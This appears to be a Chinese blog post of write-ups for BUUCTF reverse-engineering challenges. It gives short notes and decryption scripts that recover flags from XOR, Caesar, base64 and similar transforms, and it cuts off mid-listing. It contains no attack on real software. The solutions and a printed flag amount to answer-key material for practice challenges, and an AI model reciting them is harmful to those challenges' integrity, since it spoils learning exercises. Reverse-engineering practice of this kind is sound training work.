<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PS E:\...\upx-4.0.2-win64&gt; .\upx.exe</span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2023</span><br><span class="line">UPX 4.0.2       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 30th 2023</span><br><span class="line"></span><br><span class="line">Usage: upx [-123456789dlthVL] [-qvfk] [-o file] file..</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  -1     compress faster                   -9    compress better</span><br><span class="line">  -d     decompress                        -l    list compressed file</span><br><span class="line">  -t     test compressed file              -V    display version number</span><br><span class="line">  -h     give more help                    -L    display software license</span><br><span class="line">Options:</span><br><span class="line">  -q     be quiet                          -v    be verbose</span><br><span class="line">  -oFILE write output to &#x27;FILE&#x27;</span><br><span class="line">  -f     force compression of suspicious files</span><br><span class="line">  -k     keep backup files</span><br><span class="line">file..   executables to (de)compress</span><br><span class="line"></span><br><span class="line">Type &#x27;upx --help&#x27; for more detailed help.</span><br><span class="line"></span><br><span class="line">UPX comes with ABSOLUTELY NO WARRANTY; for details visit https://upx.github.io</span><br></pre></td></tr></table></figure>
<h1 id="buu006-xor"><a class="markdownIt-Anchor" href="#buu006-xor"></a> buu006-xor</h1>
<p>这道题进行了一个简单的异或操作，将前一个字符与后一个字符异或。</p>
<p>解密脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&#x27;\x66\x0A\x6B\x0C\x77\x26\x4F\x2E\x40\x11\x78\x0D\x5A\x3B\x55\x11\x70\x19\x46\x1F\x76\x22\x4D\x23\x44\x0E\x67\x06\x68\x0F\x47\x32\x4F&#x27;</span></span><br><span class="line">plaintext = [<span class="string">&#x27;f&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher) - <span class="number">1</span>):</span><br><span class="line">    plaintext.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(cipher[i]) ^ <span class="built_in">ord</span>(cipher[i+<span class="number">1</span>])))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(plaintext))</span><br></pre></td></tr></table></figure>
<h1 id="buu007-helloword"><a class="markdownIt-Anchor" href="#buu007-helloword"></a> buu007-helloword</h1>
<p>这道题是一个apk文件的逆向，可以使用Jadx的Intellij插件进行反编译，直接获得flag。</p>
<h1 id="buu008-reverse3"><a class="markdownIt-Anchor" href="#buu008-reverse3"></a> buu008-reverse3</h1>
<p>这道题是一个base64编码程序，实际上不需要对代码进行全部逆向分析，只需要通过动态调试即可得知。在编码之后，程序还进行了另一种处理：对索引为x的字节的ASCII码加x，然后与事先保存的字符串比较。可写出下列解密程序：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;e3nifIH9b_C@n@dH&#x27;</span></span><br><span class="line">dec_1 = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    dec_1.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(cipher[i]) - i))</span><br><span class="line">    </span><br><span class="line">dec_1 = <span class="string">&#x27;&#x27;</span>.join(dec_1)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(dec_1))</span><br></pre></td></tr></table></figure>
<h1 id="buu009-不一样的flag"><a class="markdownIt-Anchor" href="#buu009-不一样的flag"></a> buu009-不一样的flag</h1>
<p>走迷宫。按照0的路线走即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#1111</span><br><span class="line">01000</span><br><span class="line">01010</span><br><span class="line">00010</span><br><span class="line">1111#</span><br></pre></td></tr></table></figure>
<h1 id="buu010-simplerev"><a class="markdownIt-Anchor" href="#buu010-simplerev"></a> buu010-SimpleRev</h1>
<p>一个简单的转换。python脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;adsfkndcls&#x27;</span></span><br><span class="line">text = <span class="string">&#x27;killshadow&#x27;</span></span><br><span class="line">answer = [] * <span class="number">10</span></span><br><span class="line">k = <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0x40</span> &lt; j &lt;= <span class="number">0x40</span> + <span class="number">26</span> <span class="keyword">or</span> <span class="number">0x60</span> &lt; j &lt;= <span class="number">0x60</span> + <span class="number">26</span>):</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">chr</span>((j - <span class="number">39</span> - <span class="built_in">ord</span>(key[k % <span class="number">10</span>]) + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>) == text[i] <span class="keyword">and</span> (<span class="number">0x40</span> &lt; j &lt;= <span class="number">0x40</span>+<span class="number">26</span>):</span><br><span class="line">			answer.append(<span class="built_in">chr</span>(j))</span><br><span class="line">			k += <span class="number">1</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(answer))</span><br></pre></td></tr></table></figure>
<h1 id="buu011-java逆向解密"><a class="markdownIt-Anchor" href="#buu011-java逆向解密"></a> buu011-Java逆向解密</h1>
<p>用Intellij反编译class文件，一个简单的字节加密。</p>
<h1 id="buu012-gxyctf2019luck_guy"><a class="markdownIt-Anchor" href="#buu012-gxyctf2019luck_guy"></a> buu012-[GXYCTF2019]luck_guy</h1>
<p>脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">former = <span class="string">&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">x = <span class="string">&#x27;icug`of\x7F&#x27;</span></span><br><span class="line">t = [] * <span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">	<span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">1</span>):  </span><br><span class="line">		t.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(x[i]) - <span class="number">2</span>))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		t.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(x[i]) - <span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(former + <span class="string">&#x27;&#x27;</span>.join(t))</span><br></pre></td></tr></table></figure>
<h1 id="buu013-bjdctf2020justre"><a class="markdownIt-Anchor" href="#buu013-bjdctf2020justre"></a> buu013-[BJDCTF2020]JustRE</h1>
<p>要点19999次才能获得flag，用Shift+F12直接找到flag。</p>
<h1 id="buu014-刮开有奖"><a class="markdownIt-Anchor" href="#buu014-刮开有奖"></a> buu014-刮开有奖</h1>
<p>这道题的DialogFunc函数里面有一个sub_4010F0函数，里面对一个长度为10的数组进行了处理，直接把伪代码拷到Dev里面执行得到结果，下面还有一个是base64编码，然后可以根据判断条件把flag拼出来。</p>
<h1 id="buu015-简单注册器"><a class="markdownIt-Anchor" href="#buu015-简单注册器"></a> buu015-简单注册器</h1>
<p>直接用jadx打开，把flag生成的代码直接复制到Java执行即可。</p>
<h1 id="buu016-gwctf-2019pyre"><a class="markdownIt-Anchor" href="#buu016-gwctf-2019pyre"></a> buu016-[GWCTF 2019]pyre</h1>
<p>这是一个pyc的python字节码逆向，安装undecompyle进行反编译。<br />
<code>undecompyle x.pyc &gt; x.py</code><br />
然后逆向解密即可。</p>
<h1 id="buu017-actf新生赛2020easyre"><a class="markdownIt-Anchor" href="#buu017-actf新生赛2020easyre"></a> buu017-[ACTF新生赛2020]easyre</h1>
<p>又是一个UPX加壳，直接脱壳逆向。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span></span><br><span class="line">data = <span class="string">&#x27;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(\&#x27;&amp;%$# !&quot;&#x27;</span></span><br><span class="line">answer = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(data) + <span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span> x[i] == data[j - <span class="number">1</span>]:</span><br><span class="line">			answer.append(<span class="built_in">chr</span>(j))</span><br><span class="line">answer.append(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(answer))</span><br></pre></td></tr></table></figure>
<h1 id="buu018-findit"><a class="markdownIt-Anchor" href="#buu018-findit"></a> buu018-findit</h1>
<p>jadx反编译。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">char</span>[] a = &#123;<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span>&#125;;  </span><br><span class="line">		 <span class="keyword">final</span> <span class="type">char</span>[] b = &#123;<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>&#125;;  </span><br><span class="line">		 <span class="type">char</span>[] x = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">17</span>];  </span><br><span class="line">		 <span class="type">char</span>[] y = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">38</span>];  </span><br><span class="line">		 <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;  </span><br><span class="line">		            <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;I&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;A&#x27;</span>) || (a[i] &lt; <span class="string">&#x27;i&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;a&#x27;</span>)) &#123;  </span><br><span class="line">		                x[i] = (<span class="type">char</span>) (a[i] + <span class="number">18</span>);  </span><br><span class="line">		  &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;A&#x27;</span> || a[i] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (a[i] &lt; <span class="string">&#x27;a&#x27;</span> || a[i] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;  </span><br><span class="line">		                x[i] = a[i];  </span><br><span class="line">		  &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">		                x[i] = (<span class="type">char</span>) (a[i] - <span class="string">&#x27;\b&#x27;</span>);  </span><br><span class="line">		  &#125;  </span><br><span class="line">		        &#125;  </span><br><span class="line">		        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; <span class="number">38</span>; i2++) &#123;  </span><br><span class="line">		            <span class="keyword">if</span> ((b[i2] &lt; <span class="string">&#x27;A&#x27;</span> || b[i2] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (b[i2] &lt; <span class="string">&#x27;a&#x27;</span> || b[i2] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;  </span><br><span class="line">		                y[i2] = b[i2];  </span><br><span class="line">		  &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">		                y[i2] = (<span class="type">char</span>) (b[i2] + <span class="number">16</span>);  </span><br><span class="line">		 <span class="keyword">if</span> ((y[i2] &gt; <span class="string">&#x27;Z&#x27;</span> &amp;&amp; y[i2] &lt; <span class="string">&#x27;a&#x27;</span>) || y[i2] &gt;= <span class="string">&#x27;z&#x27;</span>) &#123;  </span><br><span class="line">		                    y[i2] = (<span class="type">char</span>) (y[i2] - <span class="number">26</span>);  </span><br><span class="line">		  &#125;  </span><br><span class="line">		            &#125;  </span><br><span class="line">		        &#125;  </span><br><span class="line">	        System.out.println(y);  </span><br><span class="line">	  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="buu019-rsa"><a class="markdownIt-Anchor" href="#buu019-rsa"></a> buu019-rsa</h1>
<p>一道crypto的题，用yafu可以分解他给的公钥，然后解密。</p>
<h1 id="buu020-actf新生赛2020rome"><a class="markdownIt-Anchor" href="#buu020-actf新生赛2020rome"></a> buu020-[ACTF新生赛2020]rome</h1>
<p>首先用UPX脱壳，然后逆向就行了，就是一个凯撒加密。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tar = <span class="string">&#x27;Qsw3sj_lz4_Ujw@l&#x27;</span></span><br><span class="line">answer = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">		k = <span class="number">0</span></span><br><span class="line">		<span class="keyword">if</span> <span class="number">64</span> &lt; j &lt;= <span class="number">90</span>:</span><br><span class="line">			k = (j - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="number">96</span> &lt; j &lt;= <span class="number">122</span>:</span><br><span class="line">			k = (j - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			k = j</span><br><span class="line">		<span class="keyword">if</span> k == <span class="built_in">ord</span>(tar[i]):</span><br><span class="line">			answer.append(<span class="built_in">chr</span>(j))</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(answer))</span><br></pre></td></tr></table></figure>
<h1 id="buu021-flareon4login"><a class="markdownIt-Anchor" href="#buu021-flareon4login"></a> buu021-[FlareOn4]login</h1>
<p>还是凯撒加密，不过是JS代码审计。位移13位。</p>
<h1 id="buu022-crackrtf"><a class="markdownIt-Anchor" href="#buu022-crackrtf"></a> buu022-CrackRTF</h1>
<p>这题进行了2次哈希，第1次是SHA哈希，第2次是MD5哈希。第1次只能输入整数，第2次输入不限，对第2次输入的暴力可能需要的时间比较长。</p>
<h1 id="buu023-wustctf2020level1"><a class="markdownIt-Anchor" href="#buu023-wustctf2020level1"></a> buu023-[WUSTCTF2020]level1</h1>
<p>直接逆，不解释了。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">output = [<span class="number">198</span>, <span class="number">232</span>, <span class="number">816</span>, <span class="number">200</span>, <span class="number">1536</span>, <span class="number">300</span>, <span class="number">6144</span>, <span class="number">984</span>, <span class="number">51200</span>, <span class="number">570</span>, <span class="number">92160</span>, <span class="number">1200</span>, <span class="number">565248</span>, <span class="number">756</span>, <span class="number">1474560</span>, <span class="number">800</span>, <span class="number">6291456</span>, <span class="number">1782</span>, <span class="number">65536000</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">	<span class="keyword">if</span> i &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">		output[i] &gt;&gt;= i+<span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		output[i] //= i+<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(o) <span class="keyword">for</span> o <span class="keyword">in</span> output]))</span><br></pre></td></tr></table></figure>
<h1 id="buu024-guet-ctf2019re"><a class="markdownIt-Anchor" href="#buu024-guet-ctf2019re"></a> buu024-[GUET-CTF2019]re</h1>
<p>这题可以使用Detect It Easy工具检测到UPX加壳，然后脱壳逆向。<br />
不知道为什么flag里面有一个字节不给，还得爆破。<br />
flag{e165421110ba03099a1c039337}</p>
<h1 id="buu025-2019红帽杯easyre"><a class="markdownIt-Anchor" href="#buu025-2019红帽杯easyre"></a> buu025-[2019红帽杯]easyRE</h1>
<p>这题是一个Linux静态编译的文件，关键就是要理清楚一些库函数的功能。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v3 &lt; v5 - <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *(_BYTE *)(v7 + v3) = alphabet[(<span class="type">unsigned</span> __int8)a1[v4] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  *(_BYTE *)(v7 + v3 + <span class="number">1LL</span>) = alphabet[(<span class="number">16</span> * (a1[v4] &amp; <span class="number">3</span>)) | ((<span class="type">unsigned</span> __int8)a1[v4 + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">  *(_BYTE *)(v7 + v3 + <span class="number">2LL</span>) = alphabet[(<span class="number">4</span> * (a1[v4 + <span class="number">1</span>] &amp; <span class="number">0xF</span>)) | ((<span class="type">unsigned</span> __int8)a1[v4 + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">  *(_BYTE *)(v7 + v3 + <span class="number">3LL</span>) = alphabet[a1[v4 + <span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">  v4 += <span class="number">3</span>;</span><br><span class="line">  v3 += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>sub_0x400E44</code>函数里面找到上面这块代码，明显能看出是用来base64编码的，因此改名为<code>base64_encode</code>。</p>
<p>然后在main函数里面找到这段代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> v18 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"> qmemcpy(secret, <span class="string">&quot;Iodl&gt;Qnb(ocy&quot;</span>, <span class="number">12</span>);</span><br><span class="line"> secret[<span class="number">12</span>] = <span class="number">0x7F</span>;</span><br><span class="line"> qmemcpy(&amp;secret[<span class="number">13</span>], <span class="string">&quot;y.i&quot;</span>, <span class="number">3</span>);</span><br><span class="line"> secret[<span class="number">16</span>] = <span class="number">0x7F</span>;</span><br><span class="line"> qmemcpy(&amp;secret[<span class="number">17</span>], <span class="string">&quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;</span>, <span class="number">19</span>);</span><br><span class="line"> <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="keyword">sizeof</span>(input));</span><br><span class="line"> read(<span class="number">0LL</span>, input, <span class="number">0x25</span>uLL);</span><br><span class="line"> input[<span class="number">36</span>] = <span class="number">0</span>;</span><br><span class="line"> LODWORD(v0) = <span class="built_in">strlen</span>(input);</span><br><span class="line"> <span class="keyword">if</span> ( v0 == <span class="number">36</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">   &#123;</span><br><span class="line">     LODWORD(v1) = <span class="built_in">strlen</span>(input);</span><br><span class="line">     <span class="keyword">if</span> ( i &gt;= v1 )</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(input[i] ^ i) != secret[i] )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">   &#125;</span><br><span class="line">...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>就是一个字符串解密，用下面的脚本进行解密：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">secret = <span class="string">&#x27;Iodl&gt;Qnb(ocy\x7fy.i\x7fd`3w&#125;wek9&#123;iy=~yL@EC&#x27;</span></span><br><span class="line">plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(secret)):</span><br><span class="line">    plaintext += <span class="built_in">chr</span>(<span class="built_in">ord</span>(secret[i]) ^ i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure>
<p>得到字符串为：<strong>Info:The first four chars are <code>flag</code></strong></p>
<p>这个是第一步，然后还有第二步，第二步看似是一个base64，编码编了10层之后出来一个网址，但这个网址是骗人的，flag在其他的地方。</p>
<p><strong><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-254172.htm">https://bbs.kanxue.com/thread-254172.htm</a></strong></p>
<p>在0x6CC0A0处还发现了一个可疑的东西，可能与flag有关系。这个东西在<code>sub_400D35</code>里面被引用了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400D35</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = time(<span class="number">0LL</span>) - qword_6CEE38;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1233</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40F790(v1);</span><br><span class="line">    sub_40FE60();</span><br><span class="line">    sub_40FE60();</span><br><span class="line">    v1 = sub_40FE60() ^ <span class="number">0x98765432</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)v1 ^ real_secret[<span class="number">0</span>]) == <span 